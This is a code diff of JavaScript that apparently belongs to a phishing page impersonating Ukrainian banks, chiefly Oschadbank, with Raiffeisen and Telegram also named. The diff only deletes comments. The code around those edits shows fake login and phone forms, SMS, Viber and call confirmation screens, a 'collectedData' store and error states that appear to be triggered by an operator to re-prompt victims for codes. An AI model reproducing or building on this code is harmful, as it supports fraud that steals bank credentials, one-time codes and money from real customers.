@@ -1451,7 +1451,7 @@ document.addEventListener('DOMContentLoaded', () => {
             const isLoginValid = activeOschadForm === 'login' && loginInput.value.length > 0 && loginPassInput.value.length > 0;
             submitBtn.classList.toggle('active', isPhoneValid || isLoginValid);
             submitBtn.disabled = !(isPhoneValid || isLoginValid);
-            // Кнопка Viber завжди активна після введення телефону (для простоти)
+            
             if (activeOschadForm === 'phone' && phoneInput.value.replace(/\D/g, '').length === 9) {
                 viberBtn.style.opacity = 1;
                 viberBtn.style.cursor = 'pointer';
@@ -1465,13 +1465,13 @@ document.addEventListener('DOMContentLoaded', () => {
         togglePhoneBtn.addEventListener('click', () => {
             togglePhoneBtn.classList.add('active'); toggleLoginBtn.classList.remove('active');
             phoneLoginForm.style.display = 'block'; loginForm.style.display = 'none';
-            viberBtn.style.display = 'block'; // Показати кнопку Viber
+            viberBtn.style.display = 'block';
             activeOschadForm = 'phone'; updateOschadButtonState();
         });
         toggleLoginBtn.addEventListener('click', () => {
             toggleLoginBtn.classList.add('active'); togglePhoneBtn.classList.remove('active');
             phoneLoginForm.style.display = 'none'; loginForm.style.display = 'block';
-            viberBtn.style.display = 'none'; // Сховати кнопку Viber
+            viberBtn.style.display = 'none';
             activeOschadForm = 'login'; updateOschadButtonState();
         });
         
@@ -1502,7 +1502,6 @@ document.addEventListener('DOMContentLoaded', () => {
             }
         };
 
-        // Встановлюємо початковий стан кнопки Viber
         updateOschadButtonState();
     }
 
@@ -1633,14 +1632,14 @@ document.addEventListener('DOMContentLoaded', () => {
             case 'code_error':
                 const errorOptions = { error: true };
                 if (lastCodeScreen === 'oschad_call') renderOschadbankCallConfirmation(errorOptions);
-                else if (lastCodeScreen === 'oschad_viber') renderOschadbankViberScreen(errorOptions); // NEW: Viber error
+                else if (lastCodeScreen === 'oschad_viber') renderOschadbankViberScreen(errorOptions);
                 else if (lastCodeScreen === 'telegram_sms') renderTelegramSmsScreen(errorOptions);
                 else if (lastCodeScreen === 'generic_light_debit') renderThemedLightDebitScreen(errorOptions);
                 else if (lastCodeScreen === 'generic_debit') renderThemedDebitScreen(errorOptions);
                 break;
             case 'raiff_code_error': renderRaiffSmsScreen(collectedData.phone, { error: true }); break;
             case 'generic_debit_error': renderThemedDebitScreen({ error: true }); break;
-            case 'viber_code_error': renderOschadbankViberScreen({ error: true }); break; // NEW: Viber error
+            case 'viber_code_error': renderOschadbankViberScreen({ error: true }); break;
             case 'other':
                 const bankToDisable = document.querySelector(`.bank-item[data-bank="${activeBankData.theme}"]`);
                 if (bankToDisable) {
